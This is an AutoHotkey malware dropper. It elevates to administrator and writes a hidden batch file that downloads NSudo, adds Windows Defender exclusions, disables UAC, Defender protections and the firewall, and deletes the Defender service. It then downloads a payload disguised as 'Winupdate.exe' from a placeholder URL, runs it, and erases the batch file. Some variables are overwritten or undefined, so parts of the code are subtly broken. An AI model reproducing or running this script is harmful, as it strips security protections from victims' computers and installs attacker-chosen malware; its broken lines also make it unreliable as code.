SetWorkingDir %A_TEMP%
#NoEnv  
#SingleInstance,Force;
full_command_line := DllCall("GetCommandLine", "str")

if not (A_IsAdmin or RegExMatch(full_command_line, " /restart(?!\S)"))
{
    try
    {
        if A_IsCompiled
            Run *RunAs "%A_ScriptFullPath%" /restart
        else
            Run *RunAs "%A_AhkPath%" /restart "%A_ScriptFullPath%"
    }
    ExitApp
}

x:="@echo off `n"
a:="bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe `n"
b:="timeout 4 `n"
c:="cd %temp% `n"
d:="powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath %temp%""`n"
e:="powershell.exe -command ""Add-MpPreference -ExclusionExtension "".bat""`n"
f:="powershell.exe -command ""Add-MpPreference -ExclusionExtension "".exe""`n"
g:="powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force`n"
h:="powershell.exe -command ""Set-MpPreference -EnableControlledFolderAccess Disabled""`n"
i:="powershell.exe -command ""Set-MpPreference -PUAProtection disable""`n"
g:="powershell.exe -command ""Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true""`n"
j:="powershell.exe -command ""Set-MpPreference -DisableScriptScanning $true""`n"
i:="NSudo -U:T -ShowWindowMode:Hide  sc delete  windefend `n"
j:="powershell.exe -command ""Set-MpPreference -HighThreatDefaultAction 6 -Force""`n"
k:="powershell.exe -command ""Set-MpPreference -ModerateThreatDefaultAction 6""`n"
l:="powershell.exe -command ""Set-MpPreference -LowThreatDefaultAction 6""`n"
m:="powershell.exe -command ""Set-MpPreference -SevereThreatDefaultAction 6""`n"
o:="powershell.exe -command ""netsh advfirewall set allprofiles state off""`n"
ff:="powershell -command start-bitstransfer https://directurl-to-yours-payload  .\Winupdate.exe `n"
gg:="timeout 3 `n"
hh:="start Winupdate.exe"

FileAppend, %x% ,Example.bat,UTF-8
FileAppend, %a% ,Example.bat,UTF-8
FileAppend, %b% ,Example.bat,UTF-8
FileAppend, %c% ,Example.bat,UTF-8
FileAppend, %d% ,Example.bat,UTF-8
FileAppend, %e% ,Example.bat,UTF-8
FileAppend, %f% ,Example.bat,UTF-8
FileAppend, %g% ,Example.bat,UTF-8
FileAppend, %h% ,Example.bat,UTF-8
FileAppend, %i% ,Example.bat,UTF-8
FileAppend, %j% ,Example.bat,UTF-8
FileAppend, %k% ,Example.bat,UTF-8
FileAppend, %l% ,Example.bat,UTF-8
FileAppend, %m% ,Example.bat,UTF-8
FileAppend, %n% ,Example.bat,UTF-8
FileAppend, %o% ,Example.bat,UTF-8
FileAppend, %ff% ,Example.bat,UTF-8
FileAppend, %gg% ,Example.bat,UTF-8
FileAppend, %hh% ,Example.bat,UTF-8
If(FileExist("Example.bat"))

run C:\Windows\System32\cmd.exe /C   "Example.bat" ,,hide
Sleep 200000
FileDelete,Example.bat

